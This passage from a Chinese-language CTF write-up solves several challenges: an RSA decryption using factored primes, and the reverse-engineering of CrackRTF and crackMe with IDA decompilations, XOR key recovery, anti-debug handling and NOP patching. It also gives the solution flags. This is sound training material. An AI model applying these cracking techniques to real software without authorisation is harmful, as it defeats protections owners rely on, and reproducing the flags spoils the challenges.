f.read()</span><br><span class="line">publickey = RSA.importKey(publickey)</span><br><span class="line"><span class="comment"># print(publickey.n)</span></span><br><span class="line"><span class="comment"># print(publickey.e)</span></span><br><span class="line">n = <span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">q = <span class="number">304008741604601924494328155975272418463</span></span><br><span class="line">r = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e,r)</span><br><span class="line"><span class="comment"># print d</span></span><br><span class="line">privatekey = RSA.construct((long(n), long(e), long(d), long(p), long(q)))</span><br><span class="line">key = PKCS1_v1_5.new(privatekey)</span><br><span class="line">msg = key.decrypt(cipher_text, e)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> msg</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag{decrypt_256}</p><p>参考:</p><p><a target="_blank" rel="noopener" href="https://wiki.x10sec.org/crypto/asymmetric/rsa/rsa_theory/#pycrypto">RSA-ctf-wiki</a></p><p><a target="_blank" rel="noopener" href="http://factordb.com/">整数分解</a></p><h3 id="CrackRTF"><a href="#CrackRTF" class="headerlink" title="CrackRTF"></a>CrackRTF</h3><p>IDA打开,追踪字符串到主要函数:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> main_0()</span><br><span class="line">&#123;</span><br><span class="line">  DWORD v0; // eax</span><br><span class="line">  DWORD v1; // eax</span><br><span class="line">  CHAR String; // [esp+4Ch] [ebp-310h]</span><br><span class="line">  <span class="built_in">int</span> v4; // [esp+150h] [ebp-20Ch]</span><br><span class="line">  CHAR String1; // [esp+154h] [ebp-208h]</span><br><span class="line">  char <span class="built_in">input</span>[<span class="number">6</span>]; // [esp+258h] [ebp-104h]</span><br><span class="line"></span><br><span class="line">  memset(<span class="built_in">input</span>, <span class="number">0</span>, 0x104u);</span><br><span class="line">  memset(&amp;String1, <span class="number">0</span>, 0x104u);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  printf(<span class="string">&quot;pls input the first passwd(1): &quot;</span>);</span><br><span class="line">  scanf(<span class="string">&quot;%s&quot;</span>, <span class="built_in">input</span>);</span><br><span class="line">  <span class="keyword">if</span> ( strlen(<span class="built_in">input</span>) != <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(<span class="string">&quot;Must be 6 characters!\n&quot;</span>);</span><br><span class="line">    ExitProcess(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = atoi(<span class="built_in">input</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt; <span class="number">100000</span> )</span><br><span class="line">    ExitProcess(<span class="number">0</span>);</span><br><span class="line">  strcat(<span class="built_in">input</span>, <span class="string">&quot;@DBApp&quot;</span>);</span><br><span class="line">  v0 = strlen(<span class="built_in">input</span>);</span><br><span class="line">  sub_40100A((BYTE *)<span class="built_in">input</span>, v0, &amp;String1);</span><br><span class="line">  <span class="keyword">if</span> ( !_strcmpi(&amp;String1, <span class="string">&quot;6E32D0943418C2C33385BC35A1470250DD8923A9&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(<span class="string">&quot;continue...\n\n&quot;</span>);</span><br><span class="line">    printf(<span class="string">&quot;pls input the first passwd(2): &quot;</span>);</span><br><span class="line">    memset(&amp;String, <span class="number">0</span>, 0x104u);</span><br><span class="line">    scanf(<span class="string">&quot;%s&quot;</span>, &amp;String);</span><br><span class="line">    <span class="keyword">if</span> ( strlen(&amp;String) != <span class="number">6</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(<span class="string">&quot;Must be 6 characters!\n&quot;</span>);</span><br><span class="line">      ExitProcess(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    strcat(&amp;String, <span class="built_in">input</span>);</span><br><span class="line">    memset(&amp;String1, <span class="number">0</span>, 0x104u);</span><br><span class="line">    v1 = strlen(&amp;String);</span><br><span class="line">    sub_401019((BYTE *)&amp;String, v1, &amp;String1);</span><br><span class="line">    <span class="keyword">if</span> ( !_strcmpi(<span class="string">&quot;27019e688a4e62a649fd99cadaafdb4e&quot;</span>, &amp;String1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !(unsigned __int8)sub_40100F(&amp;String) )</span><br><span class="line">      &#123;</span><br><span class="line">        printf(<span class="string">&quot;Error!!\n&quot;</span>);</span><br><span class="line">        ExitProcess(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      printf(<span class="string">&quot;bye ~~\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输入两次验证flag。</p><h4 id="第一次"><a href="#第一次" class="headerlink" title="第一次"></a>第一次</h4><p>hash值在线爆破,直接得第一部分123321,进入第二部分</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\CTF\Games\Exam\BUUCTF\CrackRTF&gt;CrackRTF.exe</span><br><span class="line">pls input the first passwd(1): 123321</span><br><span class="line">continue...</span><br><span class="line"></span><br><span class="line">pls input the first passwd(2):</span><br></pre></td></tr></table></figure><h4 id="第二次"><a href="#第二次" class="headerlink" title="第二次"></a>第二次</h4><p>无法爆破,观察到sub_40100F函数中:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> __cdecl <span class="title">sub_4014D0</span><span class="params">(LPCSTR lpString)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  LPCVOID lpBuffer; <span class="comment">// [esp+50h] [ebp-1Ch]</span></span><br><span class="line">  DWORD NumberOfBytesWritten; <span class="comment">// [esp+58h] [ebp-14h]</span></span><br><span class="line">  DWORD nNumberOfBytesToWrite; <span class="comment">// [esp+5Ch] [ebp-10h]</span></span><br><span class="line">  HGLOBAL hResData; <span class="comment">// [esp+60h] [ebp-Ch]</span></span><br><span class="line">  HRSRC hResInfo; <span class="comment">// [esp+64h] [ebp-8h]</span></span><br><span class="line">  HANDLE hFile; <span class="comment">// [esp+68h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  hFile = <span class="number">0</span>;</span><br><span class="line">  hResData = <span class="number">0</span>;</span><br><span class="line">  nNumberOfBytesToWrite = <span class="number">0</span>;</span><br><span class="line">  NumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">  hResInfo = FindResourceA(<span class="number">0</span>, (LPCSTR)<span class="number">0x65</span>, <span class="string">&quot;AAA&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !hResInfo )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  nNumberOfBytesToWrite = SizeofResource(<span class="number">0</span>, hResInfo);</span><br><span class="line">  hResData = LoadResource(<span class="number">0</span>, hResInfo);</span><br><span class="line">  <span class="keyword">if</span> ( !hResData )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  lpBuffer = LockResource(hResData);</span><br><span class="line">  sub_401005(lpString, (<span class="keyword">int</span>)lpBuffer, nNumberOfBytesToWrite);</span><br><span class="line">  hFile = CreateFileA(<span class="string">&quot;dbapp.rtf&quot;</span>, <span class="number">0x10000000</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( hFile == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &amp;NumberOfBytesWritten, <span class="number">0</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  CloseHandle(hFile);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>会生成一个dbapp.rtf文件。</p><p>随便输入123321得,此处用010editor打开:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20190707134714.png" alt="20190707134714"></p><p>在生成文件前sub_401005进行了异或操作:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">sub_401420</span><span class="params">(LPCSTR lpString, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+54h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = lstrlenA(lpString);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a2) ^= lpString[i % v5];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>则可以逆解出异或因子:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">0x34</span>,<span class="number">0x4f</span>,<span class="number">0x72</span>,<span class="number">0x26</span>,<span class="number">0x14</span>,<span class="number">0x30</span>,<span class="number">0x5c</span>,<span class="number">0x61</span>,<span class="number">0x6e</span>,<span class="number">0x73</span>,<span class="number">0x69</span>,<span class="number">0x5c</span>,<span class="number">0x61</span>,<span class="number">0x6e</span>,<span class="number">0x73</span>,<span class="number">0x69</span>,<span class="number">0x63</span>,<span class="number">0x70</span>,<span class="number">0x28</span>,<span class="number">0x2a</span>,<span class="number">0x33</span>,<span class="number">0x64</span>,<span class="number">0x2e</span>,<span class="number">0x65</span>,<span class="number">0x65</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x30</span>,<span class="number">0x5c</span>,<span class="number">0x64</span>,<span class="number">0x65</span>,<span class="number">0x66</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x6e</span>,<span class="number">0x67</span>,<span class="number">0x7e</span>,<span class="number">0x23</span>,<span class="number">0x33</span>,<span class="number">0x61</span>,<span class="number">0x2e</span>,<span class="number">0x65</span>,<span class="number">0x65</span>,<span class="number">0x66</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x6e</span>,<span class="number">0x67</span>,<span class="number">0x66</span>,<span class="number">0x65</span>,<span class="number">0x32</span>,<span class="number">0x30</span>,<span class="number">0x35</span>,<span class="number">0x32</span>,<span class="number">0x34</span>,<span class="number">0x4f</span>,<span class="number">0x66</span>,<span class="number">0x3d</span>,<span class="number">0x1c</span>,<span class="number">0x75</span>,<span class="number">0x74</span>,<span class="number">0x62</span>,<span class="number">0x6c</span>,<span class="number">0x7b</span>,<span class="number">0x5c</span>,<span class="number">0x66</span>,<span class="number">0x30</span>,<span class="number">0x5c</span>,<span class="number">0x66</span>,<span class="number">0x6d</span>,<span class="number">0x6f</span>,<span class="number">0x64</span>,<span class="number">0x2a</span>,<span class="number">0x61</span>,<span class="number">0x6e</span>,<span class="number">0x0e</span>,<span class="number">0x14</span>,<span class="number">0x71</span>,<span class="number">0x72</span>,<span class="number">0x71</span>,<span class="number">0x36</span>,<span class="number">0x5c</span>,<span class="number">0x66</span>,<span class="number">0x63</span>,<span class="number">0x68</span>,<span class="number">0x61</span>,<span class="number">0x72</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x74</span>,<span class="number">0x7e</span>,<span class="number">0x20</span>,<span class="number">0x34</span>,<span class="number">0x72</span>,<span class="number">0x2e</span>,<span class="number">0x26</span>,<span class="number">0x63</span>,<span class="number">0x62</span>,<span class="number">0x5c</span>,<span class="number">0x27</span>,<span class="number">0x63</span>,<span class="number">0x65</span>,<span class="number">0x5c</span>,<span class="number">0x27</span>,<span class="number">0x63</span>,<span class="number">0x63</span>,<span class="number">0x5c</span>,<span class="number">0x27</span>,<span class="number">0x2a</span>,<span class="number">0x26</span>,<span class="number">0x3b</span>,<span class="number">0x2f</span>,<span class="number">0x0f</span>,<span class="number">0x0c</span>,<span class="number">0x0a</span>,<span class="number">0x7b</span>,<span class="number">0x5c</span>,<span class="number">0x2a</span>,<span class="number">0x5c</span>,<span class="number">0x67</span>,<span class="number">0x65</span>,<span class="number">0x6e</span>,<span class="number">0x65</span>,<span class="number">0x72</span>,<span class="number">0x61</span>,<span class="number">0x74</span>,<span class="number">0x20</span>,<span class="number">0x61</span>,<span class="number">0x20</span>,<span class="number">0x1f</span>,<span class="number">0x01</span>,<span class="number">0x67</span>,<span class="number">0x74</span>,<span class="number">0x65</span>,<span class="number">0x64</span>,<span class="number">0x69</span>,<span class="number">0x74</span>,<span class="number">0x20</span>,<span class="number">0x35</span>,<span class="number">0x2e</span>,<span class="number">0x34</span>,<span class="number">0x31</span>,<span class="number">0x2e</span>,<span class="number">0x31</span>,<span class="number">0x7a</span>,<span class="number">0x3d</span>,<span class="number">0x31</span>,<span class="number">0x67</span>,<span class="number">0x43</span>,<span class="number">0x34</span>,<span class="number">0x3b</span>,<span class="number">0x7d</span>,<span class="number">0x5c</span>,<span class="number">0x76</span>,<span class="number">0x69</span>,<span class="number">0x65</span>,<span class="number">0x77</span>,<span class="number">0x6b</span>,<span class="number">0x69</span>,<span class="number">0x6e</span>,<span class="number">0x64</span>,<span class="number">0x34</span>,<span class="number">0x13</span>,<span class="number">0x66</span>,<span class="number">0x63</span>,<span class="number">0x63</span>,<span class="number">0x2e</span>,<span class="number">0x71</span>,<span class="number">0x61</span>,<span class="number">0x72</span>,<span class="number">0x64</span>,<span class="number">0x5c</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x6e</span>,<span class="number">0x67</span>,<span class="number">0x32</span>,<span class="number">0x30</span>,<span class="number">0x35</span>,<span class="number">0x32</span>,<span class="number">0x13</span>,<span class="number">0x75</span>,<span class="number">0x30</span>,<span class="number">0x0e</span>,<span class="number">0x14</span>,<span class="number">0x72</span>,<span class="number">0x32</span>,<span class="number">0x30</span>,<span class="number">0x20</span>,<span class="number">0x46</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x67</span>,<span class="number">0x5c</span>,<span class="number">0x7b</span>,<span class="number">0x4e</span>,<span class="number">0x30</span>,<span class="number">0x5f</span>,<span class="number">0x02</span>,<span class="number">0x23</span>,<span class="number">0x72</span>,<span class="number">0x37</span>,<span class="number">0x2d</span>,<span class="number">0x47</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x65</span>,<span class="number">0x5f</span>,<span class="number">0x42</span>,<span class="number">0x75</span>,<span class="number">0x67</span>,<span class="number">0x73</span>,<span class="number">0x5c</span>,<span class="number">0x7d</span>,<span class="number">0x5c</span>,<span class="number">0x70</span>,<span class="number">0x2e</span>,<span class="number">0x61</span>,<span class="number">0x0d</span>,<span class="number">0x58</span>,<span class="number">0x0f</span>,<span class="number">0x0c</span>,<span class="number">0x0a</span>,<span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">map</span>(ord, <span class="string">&quot;123321123321@DBApp&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in xrange(len(s)):</span><br><span class="line">    s[i] ^= key[i % len(key)]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在本地新建RTF文件,可知文件头6位应该为<code>”&#123;\\rtf1“</code>,则可解出第二次输入的字符:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">key = <span class="built_in">map</span>(ord, <span class="string">&quot;&#123;\\rtf1&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i in xrange(len(key)):</span><br><span class="line">    s[i] ^= key[i]</span><br><span class="line"></span><br><span class="line">print <span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(chr,s[<span class="number">0</span>:<span class="number">6</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>为:<code>~!3a@0</code></p><p>输入得最终rtf文件,里面就有flag,为:</p><p>Flag{N0_M0re_Free_Bugs}（<code>提交时要将F改为f</code>）</p><h3 id="crackMe"><a href="#crackMe" class="headerlink" title="crackMe"></a>crackMe</h3><p>解压得crackMe.exe,打开:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Come one! Crack Me~~~</span><br><span class="line">user(6-16 letters or numbers):</span><br></pre></td></tr></table></figure><p>user已经给出,为<code>welcomebeijing</code></p><p>输入后:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password(6-16 letters or numbers):</span><br></pre></td></tr></table></figure><p>IDA打开,跟踪字符串到主要函数,根据经验稍做修改:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __usercall wmain@&lt;eax&gt;(<span class="keyword">int</span> a1@&lt;ebx&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *v1; <span class="comment">// eax</span></span><br><span class="line">  FILE *v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+3h] [ebp-405h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+4h] [ebp-404h]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [esp+5h] [ebp-403h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [esp+104h] [ebp-304h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [esp+105h] [ebp-303h]</span></span><br><span class="line">  <span class="keyword">char</span> password[<span class="number">16</span>]; <span class="comment">// [esp+204h] [ebp-204h]</span></span><br><span class="line">  <span class="keyword">char</span> user[<span class="number">16</span>]; <span class="comment">// [esp+304h] [ebp-104h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Come one! Crack Me~~~\n&quot;</span>);</span><br><span class="line">  user[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;user[<span class="number">1</span>], <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">  password[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;password[<span class="number">1</span>], <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;user(6-16 letters or numbers):&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, user);</span><br><span class="line">        v1 = (FILE *)sub_3E24BE();</span><br><span class="line">        fflush(v1);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( !(<span class="keyword">unsigned</span> __int8)sub_3E1000(user) );</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;password(6-16 letters or numbers):&quot;</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, password);</span><br><span class="line">      v2 = (FILE *)sub_3E24BE();</span><br><span class="line">      fflush(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !(<span class="keyword">unsigned</span> __int8)sub_3E1000(password) );</span><br><span class="line">    init_box(user);</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;v8, <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;v6, <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">    v4 = init_print(&amp;v7, &amp;v5);</span><br><span class="line">    <span class="keyword">if</span> ( check(a1, user, password) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(&amp;v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(&amp;v7);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由调试分析得:</p><p>init_box函数会将user进行一波操作生成一个box用于后面的异或操作。</p><p>可以直接导出,但后面其实没必要用到。</p><p>init_print函数会初始化两个输出字符串,一个成功一个失败,但由于有异常花指令导致IDA无法识别为函数,根据分析,直接将异常nop掉就可以了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:003E11EA 0               nop</span><br><span class="line">.text:003E11EB 0               nop</span><br><span class="line">.text:003E11EC 0               nop</span><br><span class="line">.text:003E11ED 0               nop</span><br><span class="line">.text:003E11EE 0               nop</span><br><span class="line">.text:003E11EF 0               nop</span><br><span class="line">.text:003E11F0 0               aaa</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接着就重要的check函数:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> __cdecl <span class="title">check</span><span class="params">(<span class="keyword">char</span> *user, <span class="keyword">const</span> <span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+18h] [ebp-22Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-228h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+28h] [ebp-21Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+30h] [ebp-214h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [esp+36h] [ebp-20Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [esp+37h] [ebp-20Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [esp+38h] [ebp-20Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v10; <span class="comment">// [esp+39h] [ebp-20Bh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v11; <span class="comment">// [esp+3Ah] [ebp-20Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [esp+3Bh] [ebp-209h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [esp+3Ch] [ebp-208h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [esp+40h] [ebp-204h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [esp+41h] [ebp-203h]</span></span><br><span class="line">  _BYTE key[<span class="number">256</span>]; <span class="comment">// [esp+140h] [ebp-104h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  key[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;check_num[<span class="number">1</span>], <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v15, <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v6 &lt; <span class="built_in">strlen</span>(password) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">isdigit</span>(password[v6]) )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = password[v6] - <span class="number">48</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">isxdigit</span>(password[v6]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)(*(_DWORD *)(__readfsdword(<span class="number">0x30</span>u) + <span class="number">24</span>) + <span class="number">12</span>) != <span class="number">2</span> )</span><br><span class="line">        password[v6] = <span class="number">34</span>;</span><br><span class="line">      v8 = (password[v6] | <span class="number">0x20</span>) - <span class="number">87</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = ((password[v6] | <span class="number">0x20</span>) - <span class="number">97</span>) % <span class="number">6</span> + <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = v8 + <span class="number">16</span> * v9;</span><br><span class="line">    <span class="keyword">if</span> ( !((<span class="keyword">signed</span> <span class="keyword">int</span>)(v6 + <span class="number">1</span>) % <span class="number">2</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;v14 + v3++) = v9;</span><br><span class="line">      v9 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v5 &lt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 += box[++v11];</span><br><span class="line">    v12 = box[v11];</span><br><span class="line">    v7 = box[v10];</span><br><span class="line">    box[v10] = v12;</span><br><span class="line">    box[v11] = v7;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)(__readfsdword(<span class="number">0x30</span>u) + <span class="number">104</span>) &amp; <span class="number">0x70</span> )</span><br><span class="line">      v12 = v10 + v11;</span><br><span class="line">    key[v5] = box[(<span class="keyword">unsigned</span> __int8)(v7 + v12)] ^ *(&amp;v14 + v4);</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)(__readfsdword(<span class="number">0x30</span>u) + <span class="number">2</span>) &amp; <span class="number">0xFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">-83</span>;</span><br><span class="line">      v11 = <span class="number">43</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">xor</span>(check_num, user, v5++);</span><br><span class="line">    v4 = v5;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &gt;= &amp;v14 + <span class="built_in">strlen</span>(&amp;v14) + <span class="number">1</span> - &amp;v15 )</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  check2(key, &amp;check_num);</span><br><span class="line">  <span class="keyword">return</span> check_num == <span class="number">43924</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据调试,输入的password会每两个为一组(第一个while就是在将输入转为两个为一组的十六进制字符),来与box中的特定位置的数异或,得到一组8个key,后进入check2进行验证,最终得到<code>check_num == 43924</code>则成功。</p><p>check2:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_DWORD *__usercall check2@&lt;eax&gt;(<span class="keyword">int</span> a1@&lt;ebx&gt;, _BYTE *key, _DWORD *a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ST28_4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// ST20_4</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// ST1C_4</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// di</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// ST14_4</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v26; <span class="comment">// 